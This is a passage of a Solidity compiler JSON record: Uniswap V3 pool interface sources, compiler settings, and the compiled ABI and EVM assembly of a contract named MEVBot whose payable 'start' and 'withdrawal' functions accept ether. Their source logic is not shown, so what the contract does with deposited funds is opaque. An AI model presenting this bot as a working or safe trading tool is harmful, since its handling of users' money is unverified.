				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that is not stored\n/// @notice Contains view functions to provide information about the pool that is computed rather than stored on the\n/// blockchain. The functions here may have variable gas costs.\ninterface IUniswapV3PoolDerivedState {\n    /// @notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\n    /// @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing\n    /// the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,\n    /// you must call it with secondsAgos = [3600, 0].\n    /// @dev The time weighted average tick represents the geometric time weighted average price of the pool, in\n    /// log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\n    /// @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned\n    /// @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp\n    /// @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block\n    /// timestamp\n    function observe(uint32[] calldata secondsAgos)\n        external\n        view\n        returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s);\n\n    /// @notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\n    /// @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.\n    /// I.e., snapshots cannot be compared if a position is not held for the entire period between when the first\n    /// snapshot is taken and the second snapshot is taken.\n    /// @param tickLower The lower tick of the range\n    /// @param tickUpper The upper tick of the range\n    /// @return tickCumulativeInside The snapshot of the tick accumulator for the range\n    /// @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range\n    /// @return secondsInside The snapshot of seconds per liquidity for the range\n    function snapshotCumulativesInside(int24 tickLower, int24 tickUpper)\n        external\n        view\n        returns (\n            int56 tickCumulativeInside,\n            uint160 secondsPerLiquidityInsideX128,\n            uint32 secondsInside\n        );\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that can change\n/// @notice These methods compose the pool's state, and can change with any frequency including multiple times\n/// per transaction\ninterface IUniswapV3PoolState {\n    /// @notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas\n    /// when accessed externally.\n    /// @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value\n    /// tick The current tick of the pool, i.e. according to the last tick transition that was run.\n    /// This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick\n    /// boundary.\n    /// observationIndex The index of the last oracle observation that was written,\n    /// observationCardinality The current maximum number of observations stored in the pool,\n    /// observationCardinalityNext The next maximum number of observations, to be updated when the observation.\n    /// feeProtocol The protocol fee for both tokens of the pool.\n    /// Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0\n    /// is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.\n    /// unlocked Whether the pool is currently locked to reentrancy\n    function slot0()\n        external\n        view\n        returns (\n            uint160 sqrtPriceX96,\n            int24 tick,\n            uint16 observationIndex,\n            uint16 observationCardinality,\n            uint16 observationCardinalityNext,\n            uint8 feeProtocol,\n            bool unlocked\n        );\n\n    /// @notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal0X128() external view returns (uint256);\n\n    /// @notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal1X128() external view returns (uint256);\n\n    /// @notice The amounts of token0 and token1 that are owed to the protocol\n    /// @dev Protocol fees will never exceed uint128 max in either token\n    function protocolFees() external view returns (uint128 token0, uint128 token1);\n\n    /// @notice The currently in range liquidity available to the pool\n    /// @dev This value has no relationship to the total liquidity across all ticks\n    function liquidity() external view returns (uint128);\n\n    /// @notice Look up information about a specific tick in the pool\n    /// @param tick The tick to look up\n    /// @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or\n    /// tick upper,\n    /// liquidityNet how much liquidity changes when the pool price crosses the tick,\n    /// feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,\n    /// feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,\n    /// tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick\n    /// secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,\n    /// secondsOutside the seconds spent on the other side of the tick from the current tick,\n    /// initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.\n    /// Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.\n    /// In addition, these values are only relative and must be used only in comparison to previous snapshots for\n    /// a specific position.\n    function ticks(int24 tick)\n        external\n        view\n        returns (\n            uint128 liquidityGross,\n            int128 liquidityNet,\n            uint256 feeGrowthOutside0X128,\n            uint256 feeGrowthOutside1X128,\n            int56 tickCumulativeOutside,\n            uint160 secondsPerLiquidityOutsideX128,\n            uint32 secondsOutside,\n            bool initialized\n        );\n\n    /// @notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information\n    function tickBitmap(int16 wordPosition) external view returns (uint256);\n\n    /// @notice Returns the information about a position by the position's key\n    /// @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\n    /// @return _liquidity The amount of liquidity in the position,\n    /// Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,\n    /// Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,\n    /// Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,\n    /// Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\n    function positions(bytes32 key)\n        external\n        view\n        returns (\n            uint128 _liquidity,\n            uint256 feeGrowthInside0LastX128,\n            uint256 feeGrowthInside1LastX128,\n            uint128 tokensOwed0,\n            uint128 tokensOwed1\n        );\n\n    /// @notice Returns data about a specific observation index\n    /// @param index The element of the observations array to fetch\n    /// @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time\n    /// ago, rather than at a specific index in the array.\n    /// @return blockTimestamp The timestamp of the observation,\n    /// Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,\n    /// Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,\n    /// Returns initialized whether the observation has been initialized and the values are safe to use\n    function observations(uint256 index)\n        external\n        view\n        returns (\n            uint32 blockTimestamp,\n            int56 tickCumulative,\n            uint160 secondsPerLiquidityCumulativeX128,\n            bool initialized\n        );\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that never changes\n/// @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values\ninterface IUniswapV3PoolImmutables {\n    /// @notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\n    /// @return The contract address\n    function factory() external view returns (address);\n\n    /// @notice The first of the two tokens of the pool, sorted by address\n    /// @return The token contract address\n    function token0() external view returns (address);\n\n    /// @notice The second of the two tokens of the pool, sorted by address\n    /// @return The token contract address\n    function token1() external view returns (address);\n\n    /// @notice The pool's fee in hundredths of a bip, i.e. 1e-6\n    /// @return The fee\n    function fee() external view returns (uint24);\n\n    /// @notice The pool tick spacing\n    /// @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive\n    /// e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...\n    /// This value is an int24 to avoid casting even though it is always positive.\n    /// @return The tick spacing\n    function tickSpacing() external view returns (int24);\n\n    /// @notice The maximum amount of position liquidity that can use any tick in the range\n    /// @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and\n    /// also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\n    /// @return The max amount of liquidity per tick\n    function maxLiquidityPerTick() external view returns (uint128);\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"contracts/bot.sol": {
				"MEVBot": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "string",
									"name": "_mainTokenSymbol",
									"type": "string"
								},
								{
									"internalType": "string",
									"name": "_mainTokenName",
									"type": "string"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "string",
									"name": "_msg",
									"type": "string"
								}
							],
							"name": "Log",
							"type": "event"
						},
						{
							"inputs": [],
							"name": "start",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tokenName",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tokenSymbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "withdrawal",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"contracts/bot.sol\":516:16894  contract MEVBot {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x40\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_3\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_3:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_4\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_4:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_5\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_5:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_6:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_8\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_6)\ntag_8:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_10\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_10:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_11\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_11:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_12\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_12:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_13:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_15\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_13)\ntag_15:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"contracts/bot.sol\":754:770  _mainTokenSymbol */\n  dup2\n    /* \"contracts/bot.sol\":740:751  tokenSymbol */\n  0x01\n    /* \"contracts/bot.sol\":740:770  tokenSymbol = _mainTokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"contracts/bot.sol\":792:806  _mainTokenName */\n  dup1\n    /* \"contracts/bot.sol\":780:789  tokenName */\n  0x00\n    /* \"contracts/bot.sol\":780:806  tokenName = _mainTokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"contracts/bot.sol\":649:813  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {... */\n  pop\n  pop\n    /* \"contracts/bot.sol\":516:16894  contract MEVBot {... */\n  jump(tag_22)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_24\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_23)\ntag_24:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_23\n  jumpi\n  swap2\n  dup3\n  add\ntag_25:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_26\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_25)\ntag_26:\ntag_23:\n  pop\n  swap1\n  pop\n  tag_27\n  swap2\n  swap1\n  tag_28\n  jump\t// in\ntag_27:\n  pop\n  swap1\n  jump\t// out\ntag_28:\n  tag_29\n  swap2\n  swap1\ntag_30:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_31\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_30)\ntag_31:\n  pop\n  swap1\n  jump\ntag_29:\n  swap1\n  jump\t// out\ntag_22:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/bot.sol\":516:16894  contract MEVBot {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c02a931\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":539:562  string public tokenName */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_9:\n        /* \"contracts/bot.sol\":539:562  string public tokenName */\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_12:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_14\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_12)\n    tag_14:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"contracts/bot.sol\":539:562  string public tokenName */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_15\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_15:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":568:593  string public tokenSymbol */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_16\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_16:\n        /* \"contracts/bot.sol\":568:593  string public tokenSymbol */\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_19:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_19)\n    tag_21:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"contracts/bot.sol\":568:593  string public tokenSymbol */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_22\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_22:\n      pop\n      swap3\n      pop\n      pop\n      